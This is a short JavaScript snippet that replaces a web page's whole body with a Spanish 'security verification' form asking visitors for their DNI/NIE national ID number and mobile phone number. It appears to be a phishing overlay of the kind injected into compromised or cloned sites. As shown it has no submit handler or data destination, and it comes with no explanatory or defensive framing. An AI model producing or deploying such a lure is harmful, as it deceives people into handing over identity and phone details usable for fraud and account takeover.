document.body.innerHTML=`
<div style="font-family:sans-serif; text-align:center; margin-top:50px; font-size:1.2rem; color:#333;">
    <h2 style="color:#333;">Verificación de Seguridad</h2>
    <p>Por favor, confirme su identidad para continuar.</p>
    <form style="display:inline-block; width:100%; max-width:400px; background:#f9f9f9; padding:1.5em 2em; border:1px solid #ddd; border-radius:8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); text-align:left; font-size:1rem;">
        <label style="font-weight:600; margin-bottom:5px;">DNI / NIE:</label>
        <input type="text" style="width:100%; margin-bottom:15px; border:1px solid #ccc; border-radius:5px; font-size:1rem; box-sizing:border-box;">

        <label style="font-weight:600; margin-bottom:5px;">Teléfono Móvil:</label>
        <input type="tel" style="width:100%; margin-bottom:20px; border:1px solid #ccc; border-radius:5px; font-size:1rem; box-sizing:border-box;">

        <button style="width:100%; padding:10px; background:#28a745; color:white; border:none; border-radius:5px; cursor:pointer; font-size:1rem; transition: background 0.3s;">
            Validar Datos
        </button>
    </form>
</div>

`;
